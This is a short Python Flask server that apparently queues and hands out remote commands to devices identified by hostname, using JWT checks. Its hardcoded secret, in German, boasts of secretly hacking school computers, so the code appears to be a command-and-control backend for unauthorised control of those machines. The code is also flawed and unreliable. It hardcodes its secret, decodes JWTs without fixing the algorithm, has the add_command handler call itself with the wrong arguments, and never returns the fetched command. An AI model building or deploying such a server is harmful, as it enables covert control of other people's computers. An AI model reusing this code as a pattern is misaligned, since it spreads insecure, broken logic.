from flask import Flask, make_response, request
import management
import jwt

from management import Command

SECRET = "iCH hAcKe scHuLcomPuTer, aBer das DaRf niemAnd wIsSen!1!"


app = Flask(__name__)

@app.route("/status")
def status():
    return make_response({"mode":management.get_active_mode(), "devices":management.get_active_devices()})

@app.post("/command/add/<device_hostname>")
def add_command(device_hostname):
    token = request.headers.get("token")
    try:
        payload = jwt.decode(token, SECRET)
    except jwt.ExpiredSignatureError:
        return "TOKEN EXPIRED", 401
    except jwt.InvalidTokenError:
        return "INVALID TOKEN", 401
    except jwt.PyJWTError:
        return "TOKEN-AUTH ERROR", 500
    else:
        if payload["sub"] != "theOnlyLino":
            return "YOU ARE NOT LINO", 401
        else:
            add_command(device_hostname, Command(request.data))

@app.get("/commands/get")
def get_command():
    token = request.headers.get("token")
    try:
        payload = jwt.decode(token, SECRET)
    except jwt.ExpiredSignatureError:
        return "TOKEN EXPIRED", 401
    except jwt.InvalidTokenError:
        return "INVALID TOKEN", 401
    except jwt.PyJWTError:
        return "TOKEN-AUTH ERROR", 500
    else:
        device_hostname = payload["sub"]
        management.get_device(device_hostname).get()